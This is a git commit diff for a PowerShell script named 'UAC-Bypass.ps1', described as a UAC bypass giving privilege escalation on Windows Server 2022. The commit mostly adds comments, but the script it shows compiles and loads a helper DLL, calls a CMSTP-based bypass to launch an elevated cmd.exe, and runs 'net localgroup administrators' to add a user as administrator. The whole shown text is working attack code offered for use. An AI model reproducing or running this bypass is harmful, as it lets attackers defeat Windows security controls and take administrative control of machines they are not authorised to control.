0d3a5e2927dfa216fcc1e8c2ae65abbf5273c832
Patrick x0xr00t Hoogeveen <25748471+x0xr00t@users.noreply.github.com>
2021-09-24 20:27:06 +0200

    Update UAC-Bypass.ps1

--- UAC-Bypass.ps1
+++ UAC-Bypass.ps1
@@ -6,16 +6,20 @@
 # Name   : UAC Bypass Win Server 2022
 # Impact : Privesc 
 # 
-# Usage  : run the powershell file and it makes the dll and places it in dir. 
+# Usage  : run the .ps1 file. 
 
 
-#
+# Naking the dll
 Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
 
+# Using the Dll
 [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
 
+# Start elevated cmd
 [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
+# Add user to group
 net localgroup administrators {userhere} /add
+# Powershell Elevated 
 If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
 {
   # Relaunch as an elevated process:
